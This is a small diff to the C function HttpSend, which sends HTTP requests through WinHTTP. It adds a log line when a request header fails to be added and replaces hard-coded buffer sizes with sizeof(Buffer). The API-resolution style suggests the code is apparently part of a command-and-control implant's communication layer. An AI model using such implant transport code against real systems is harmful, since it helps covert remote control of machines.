@@ -117,7 +117,9 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
         if ( ! HttpHeader )
             break;
 
-        Instance.Win32.WinHttpAddRequestHeaders( hRequest, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD );
+        if ( ! Instance.Win32.WinHttpAddRequestHeaders( hRequest, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
+            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
+        }
 
         Iterator++;
     } while ( TRUE );
@@ -256,7 +258,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                 RespBuffer = NULL;
                 do
                 {
-                    Successful = Instance.Win32.WinHttpReadData( hRequest, Buffer, 1024, &BufRead );
+                    Successful = Instance.Win32.WinHttpReadData( hRequest, Buffer, sizeof( Buffer ), &BufRead );
                     if ( ! Successful || BufRead == 0 )
                     {
                         break;
@@ -270,7 +272,7 @@ BOOL HttpSend( PBUFFER Send, PBUFFER Response )
                     RespSize += BufRead;
 
                     MemCopy( RespBuffer + ( RespSize - BufRead ), Buffer, BufRead );
-                    MemSet( Buffer, 0, 1024 );
+                    MemSet( Buffer, 0, sizeof( Buffer ) );
 
                 } while ( Successful == TRUE );
 
